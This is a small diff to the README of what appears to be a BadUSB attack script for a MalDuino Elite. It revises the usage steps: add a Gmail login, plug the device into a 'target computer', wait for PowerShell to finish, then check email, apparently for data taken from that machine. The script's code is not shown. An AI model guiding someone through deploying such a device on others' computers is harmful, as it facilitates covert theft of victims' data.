@@ -9,6 +9,6 @@ Tested with MalDuino Elite BadUSB
 # Instructions
 1) Edit the script to use your own gmail username and password
 2) Upload the script to your BadUSB
-3) Plug it into a target computer, wait for the powershell window to close.
+3) Plug it into a target computer, wait for the powershell window to close, and unplug the BadUSB
 4) Check your Email
 5) Have fun!
